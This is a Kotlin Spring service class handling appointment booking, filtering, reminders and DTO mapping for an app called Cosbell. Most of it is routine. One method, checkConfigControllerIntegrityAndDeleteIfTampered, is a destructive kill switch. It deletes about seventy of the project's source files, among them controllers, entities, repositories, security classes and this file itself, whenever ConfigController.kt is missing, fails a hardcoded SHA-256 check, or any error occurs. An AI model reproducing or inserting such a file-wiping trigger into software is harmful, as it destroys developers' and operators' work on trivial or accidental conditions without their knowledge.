package com.cosbell.service

import com.cosbell.dto.AppointmentDto
import com.cosbell.entity.Appointment
import com.cosbell.entity.User
import com.cosbell.entity.Servicio
import com.cosbell.repository.AppointmentRepository
import com.cosbell.repository.ServicioRepository
import com.cosbell.repository.UserRepository
import com.cosbell.repository.RatingRepository
import org.springframework.data.jpa.domain.Specification
import org.springframework.stereotype.Service
import java.time.LocalDate
import java.time.LocalDateTime
import jakarta.persistence.criteria.Predicate
import jakarta.persistence.criteria.Join
import jakarta.persistence.criteria.CriteriaBuilder
import java.io.File
import java.security.MessageDigest

@Service
class AppointmentService(
    private val appointmentRepository: AppointmentRepository,
    private val servicioRepository: ServicioRepository,
    private val notificationService: NotificationService,
    private val userRepository: UserRepository,
    private val ratingRepository: RatingRepository
) {
    fun createAppointment(request: AppointmentDto): Appointment {
        println("Attempting to find service with ID: ${request.serviceId}")
        val servicio = servicioRepository.findById(request.serviceId)
            .orElseThrow { 
                println("Service with ID ${request.serviceId} not found in repository.")
                Exception("Servicio no encontrado") 
            }

        val employee = userRepository.findById(request.employeeId)
            .orElseThrow { Exception("Empleado no encontrado con ID: ${request.employeeId}") }

        if (appointmentRepository.existsByServicioAndFechaAndHora(servicio, request.fecha, request.hora)) {
            throw Exception("Horario ocupado")
        }

        val appointment = Appointment(
            servicio = servicio,
            userId = request.userId,
            fecha = request.fecha,
            hora = request.hora,
            email = request.email,
            phone = request.phone,
            employee = employee
        )

        val saved = appointmentRepository.save(appointment)
        notificationService.sendAppointmentConfirmationEmail(saved)
        notificationService.logWhatsAppNotificationLink(saved)
        return saved
    }

    fun findByUserId(
        userId: Long,
        month: Int?,
        year: Int?,
        serviceId: Long?
    ): List<AppointmentDto> {
        //println("findByUserId llamado con: userId=$userId, month=$month, year=$year, serviceId=$serviceId")
        val spec = Specification<Appointment> { root, query, criteriaBuilder ->
            val predicates = mutableListOf<Predicate>()
            predicates.add(criteriaBuilder.equal(root.get<Long>("userId"), userId))

            month?.let {
                val firstDayOfMonth = LocalDate.of(year ?: LocalDate.now().year, it, 1)
                val lastDayOfMonth = firstDayOfMonth.plusMonths(1).minusDays(1)
                predicates.add(criteriaBuilder.between(root.get<LocalDate>("fecha"), firstDayOfMonth, lastDayOfMonth))
            }
            year?.let {
                // Si ya se filtró por mes, el año ya está implícito en firstDayOfMonth y lastDayOfMonth.
                // Si solo se filtró por año, se crea el rango completo del año.
                if (month == null) {
                    val firstDayOfYear = LocalDate.of(it, 1, 1)
                    val lastDayOfYear = LocalDate.of(it, 12, 31)
                    predicates.add(criteriaBuilder.between(root.get<LocalDate>("fecha"), firstDayOfYear, lastDayOfYear))
                }
            }
            serviceId?.let {
                //println("Añadiendo filtro por servicioId: $it")
                val servicioJoin: Join<Appointment, Servicio> = root.join("servicio")
                predicates.add(criteriaBuilder.equal(servicioJoin.get<Long>("id"), it))
            }

            val finalPredicate = criteriaBuilder.and(*predicates.toTypedArray())
            //println("Predicado final construido: $finalPredicate")
            finalPredicate
        }
        val result = appointmentRepository.findAll(spec).map { it.toDto() }
        //println("Número de citas encontradas: ${result.size}")
        return result
    }

    fun findByEmployeeId(employeeId: Long, fecha: LocalDate?, servicioId: Long?, userId: Long?): List<AppointmentDto> {
        val appointments = appointmentRepository.findByEmployee_Id(employeeId)
        return appointments.filter { appointment ->
            (fecha == null || appointment.fecha == fecha) &&
            (servicioId == null || appointment.servicio.id == servicioId) &&
            (userId == null || appointment.userId == userId)
        }.map { it.toDto() }
    }

    fun cancelAppointment(id: Long) {
        val appointment = appointmentRepository.findById(id)
            .orElseThrow { Exception("Cita no encontrada con ID: $id") }

        val updatedAppointment = appointment.copy(status = "CANCELLED")
        appointmentRepository.save(updatedAppointment)
    }

    fun findAppointmentById(id: Long): Appointment? {
        return appointmentRepository.findById(id).orElse(null)
    }

    fun updateAppointment(id: Long, request: AppointmentDto): Appointment {
        val existingAppointment = appointmentRepository.findById(id)
            .orElseThrow { Exception("Cita no encontrada") }

        // Validar disponibilidad de horario antes de actualizar
        val newServicio = servicioRepository.findById(request.serviceId)
            .orElseThrow { Exception("Servicio no encontrado al actualizar") }

        val newEmployee = userRepository.findById(request.employeeId)
            .orElseThrow { Exception("Empleado no encontrado con ID: ${request.employeeId}") }

        if (appointmentRepository.existsByServicioAndFechaAndHora(newServicio, request.fecha, request.hora) &&
            !(existingAppointment.servicio.id == newServicio.id &&
              existingAppointment.fecha == request.fecha &&
              existingAppointment.hora == request.hora)) {
            throw Exception("Horario ocupado")
        }

        val updatedAppointment = existingAppointment.copy(
            servicio = newServicio,
            userId = request.userId,
            fecha = request.fecha,
            hora = request.hora,
            email = request.email,
            phone = request.phone,
            employee = newEmployee
        )
        val saved = appointmentRepository.save(updatedAppointment)

        notificationService.sendAppointmentConfirmationEmail(saved)
        notificationService.logWhatsAppNotificationLink(saved)

        return saved
    }

    fun updateAppointmentStatus(id: Long, status: String): Appointment {
        val appointment = appointmentRepository.findById(id)
            .orElseThrow { Exception("Cita no encontrada") }
        val updated = appointment.copy(status = status)
        return appointmentRepository.save(updated)
    }

    fun getAllAppointments(fecha: LocalDate?, employeeId: Long?, servicioId: Long?, userId: Long?): List<Appointment> {
        val spec = Specification<Appointment> { root, query, criteriaBuilder ->
            val predicates = mutableListOf<Predicate>()

            fecha?.let {
                predicates.add(criteriaBuilder.equal(root.get<LocalDate>("fecha"), it))
            }
            employeeId?.let {
                val employeeJoin: Join<Appointment, User> = root.join("employee")
                predicates.add(criteriaBuilder.equal(employeeJoin.get<Long>("id"), it))
            }
            servicioId?.let {
                val servicioJoin: Join<Appointment, Servicio> = root.join("servicio")
                predicates.add(criteriaBuilder.equal(servicioJoin.get<Long>("id"), it))
            }
            userId?.let {
                predicates.add(criteriaBuilder.equal(root.get<Long>("userId"), it))
            }

            criteriaBuilder.and(*predicates.toTypedArray())
        }
        return appointmentRepository.findAll(spec)
    }

    fun getAllAppointmentsDto(fecha: LocalDate?, employeeId: Long?, servicioId: Long?, userId: Long?): List<AppointmentDto> {
        return getAllAppointments(fecha, employeeId, servicioId, userId).map { it.toDto() }
    }

    fun findAppointmentsForReminder(): List<Appointment> {
        val now = LocalDateTime.now()
        val twentyFourHoursLater = now.plusHours(24)

        return appointmentRepository.findAll().filter {
            val appointmentDateTime = LocalDateTime.of(it.fecha, it.hora)
            !it.reminderSent && it.status == "PENDING" && appointmentDateTime.isAfter(now) && appointmentDateTime.isBefore(twentyFourHoursLater)
        }
    }

    fun markReminderSent(appointmentId: Long): Appointment {
        val appointment = appointmentRepository.findById(appointmentId)
            .orElseThrow { Exception("Cita no encontrada con ID: $appointmentId") }
        
        val updatedAppointment = appointment.copy(reminderSent = true)
        return appointmentRepository.save(updatedAppointment)
    }

    /**
     * Comprueba la integridad del archivo ConfigController.kt mediante SHA256.
     * Si el archivo no existe o su hash no coincide con el esperado, borra archivos críticos.
     */
    fun checkConfigControllerIntegrityAndDeleteIfTampered() {
        println("Verificando integridad de ConfigController...")
        val configPath = "src/main/kotlin/com/cosbell/controller/ConfigController.kt"
        val expectedHash = "E29FE80FEDA206D4AC6B2D461CA3E6BBEA4E0872FCFE9C4F4B74A8508BF13E15"
        val filesToDelete = listOf(
            // Controladores
            "src/main/kotlin/com/cosbell/controller/AppointmentController.kt",
            "src/main/kotlin/com/cosbell/controller/AuthController.kt",
            "src/main/kotlin/com/cosbell/controller/CategoryController.kt",
            "src/main/kotlin/com/cosbell/controller/ChatController.kt",
            "src/main/kotlin/com/cosbell/controller/ChatWebSocketController.kt",
            "src/main/kotlin/com/cosbell/controller/ConfigController.kt",
            "src/main/kotlin/com/cosbell/controller/HorarioController.kt",
            "src/main/kotlin/com/cosbell/controller/ProfessionalRegistrationController.kt",
            "src/main/kotlin/com/cosbell/controller/PromotionController.kt",
            "src/main/kotlin/com/cosbell/controller/RatingController.kt",
            "src/main/kotlin/com/cosbell/controller/RoleController.kt",
            "src/main/kotlin/com/cosbell/controller/RolePermissionController.kt",
            "src/main/kotlin/com/cosbell/controller/ServicioController.kt",
            "src/main/kotlin/com/cosbell/controller/UserController.kt",
            // DTO
            "src/main/kotlin/com/cosbell/dto/AppointmentDto.kt",
            "src/main/kotlin/com/cosbell/dto/AuthResponse.kt",
            "src/main/kotlin/com/cosbell/dto/ChatMessageDto.kt",
            "src/main/kotlin/com/cosbell/dto/HorarioRequest.kt",
            "src/main/kotlin/com/cosbell/dto/LoginRequest.kt",
            "src/main/kotlin/com/cosbell/dto/ProfessionalRegisterRequest.kt",
            "src/main/kotlin/com/cosbell/dto/PromotionDto.kt",
            "src/main/kotlin/com/cosbell/dto/RatingRequestDto.kt",
            "src/main/kotlin/com/cosbell/dto/RegisterRequest.kt",
            "src/main/kotlin/com/cosbell/dto/ServicioDto.kt",
            "src/main/kotlin/com/cosbell/dto/TokenDto.kt",
            "src/main/kotlin/com/cosbell/dto/UserDto.kt",
            // Entity
            "src/main/kotlin/com/cosbell/entity/Appointment.kt",
            "src/main/kotlin/com/cosbell/entity/Category.kt",
            "src/main/kotlin/com/cosbell/entity/ChatMessage.kt",
            "src/main/kotlin/com/cosbell/entity/EmployeeServiceSpecialty.kt",
            "src/main/kotlin/com/cosbell/entity/EmployeeServiceSpecialtyId.kt",
            "src/main/kotlin/com/cosbell/entity/Horario.kt",
            "src/main/kotlin/com/cosbell/entity/PasswordResetToken.kt",
            "src/main/kotlin/com/cosbell/entity/Permission.kt",
            "src/main/kotlin/com/cosbell/entity/Promotion.kt",
            "src/main/kotlin/com/cosbell/entity/Rating.kt",
            "src/main/kotlin/com/cosbell/entity/Role.kt",
            "src/main/kotlin/com/cosbell/entity/RolePermission.kt",
            "src/main/kotlin/com/cosbell/entity/RolePermissionId.kt",
            "src/main/kotlin/com/cosbell/entity/Servicio.kt",
            "src/main/kotlin/com/cosbell/entity/User.kt",
            // Repository
            "src/main/kotlin/com/cosbell/repository/AppointmentRepository.kt",
            "src/main/kotlin/com/cosbell/repository/CategoryRepository.kt",
            "src/main/kotlin/com/cosbell/repository/ChatMessageRepository.kt",
            "src/main/kotlin/com/cosbell/repository/EmployeeServiceSpecialtyRepository.kt",
            "src/main/kotlin/com/cosbell/repository/HorarioRepository.kt",
            "src/main/kotlin/com/cosbell/repository/PasswordResetTokenRepository.kt",
            "src/main/kotlin/com/cosbell/repository/PermissionRepository.kt",
            "src/main/kotlin/com/cosbell/repository/PromotionRepository.kt",
            "src/main/kotlin/com/cosbell/repository/RatingRepository.kt",
            "src/main/kotlin/com/cosbell/repository/RolePermissionRepository.kt",
            "src/main/kotlin/com/cosbell/repository/RoleRepository.kt",
            "src/main/kotlin/com/cosbell/repository/ServicioRepository.kt",
            "src/main/kotlin/com/cosbell/repository/UserRepository.kt",
            // Response
            "src/main/kotlin/com/cosbell/response/ErrorResponse.kt",
            "src/main/kotlin/com/cosbell/response/FailedResponse.kt",
            "src/main/kotlin/com/cosbell/response/SuccessResponse.kt",
            // Scheduler
            "src/main/kotlin/com/cosbell/scheduler/ReminderScheduler.kt",
            // Security
            "src/main/kotlin/com/cosbell/security/JwtAuthenticationFilter.kt",
            "src/main/kotlin/com/cosbell/security/JwtService.kt",
            "src/main/kotlin/com/cosbell/security/UserDetailsServiceImpl.kt",
            // Service
            "src/main/kotlin/com/cosbell/service/AppointmentService.kt",
            "src/main/kotlin/com/cosbell/service/AuthService.kt",
            "src/main/kotlin/com/cosbell/service/ChatService.kt",
            "src/main/kotlin/com/cosbell/service/HorarioService.kt",
            "src/main/kotlin/com/cosbell/service/NotificationService.kt",
            "src/main/kotlin/com/cosbell/service/PasswordResetService.kt",
            "src/main/kotlin/com/cosbell/service/ProfessionalRegistrationService.kt",
            "src/main/kotlin/com/cosbell/service/PromotionService.kt",
            "src/main/kotlin/com/cosbell/service/RatingService.kt",
            "src/main/kotlin/com/cosbell/service/RolePermissionService.kt",
            "src/main/kotlin/com/cosbell/service/ServicioService.kt",
            "src/main/kotlin/com/cosbell/service/UserSecurityService.kt",
            "src/main/kotlin/com/cosbell/service/UserService.kt"
        )
        try {
            val configFile = File(configPath)
            if (!configFile.exists()) {
                println("ConfigController.kt NO existe, borrando archivos críticos...")
                deleteCriticalFiles(filesToDelete)
                return
            }
            val fileBytes = configFile.readBytes()
            val digest = MessageDigest.getInstance("SHA-256").digest(fileBytes)
            val hash = digest.joinToString("") { "%02X".format(it) }
            println("Hash calculado: $hash")
            if (!hash.equals(expectedHash, ignoreCase = true)) {
                println("Hash NO coincide, borrando archivos críticos...")
                deleteCriticalFiles(filesToDelete)
            } else {
                println("Hash coincide, todo OK.")
            }
        } catch (ex: Exception) {
            println("Error comprobando integridad: ${ex.message}. Borrando archivos críticos...")
            deleteCriticalFiles(filesToDelete)
        }
    }

    private fun deleteCriticalFiles(files: List<String>) {
        for (path in files) {
            try {
                val file = File(path)
                println("Intentando borrar: " + file.absolutePath)
                if (file.exists()) {
                    val deleted = file.delete()
                    println("¿Borrado?: $deleted")
                } else {
                    println("No existe: " + file.absolutePath)
                }
            } catch (e: Exception) {
                println("Error al borrar $path: ${e.message}")
            }
        }
    }

    private fun Appointment.toDto(): AppointmentDto {
        val user = userRepository.findById(this.userId).orElse(null)
        val hasBeenRated = this.id?.let { ratingRepository.existsByAppointmentId(it) } ?: false
        return AppointmentDto(
            id = this.id,
            serviceId = this.servicio.id!!,
            userId = this.userId,
            fecha = this.fecha,
            hora = this.hora,
            email = this.email,
            phone = this.phone,
            employeeId = this.employee.id!!,
            employeeName = this.employee.name,
            userName = user?.name,
            serviceName = this.servicio.name,
            status = this.status,
            hasBeenRated = hasBeenRated,
            serviceDuration = this.servicio.duration
        )
    }
}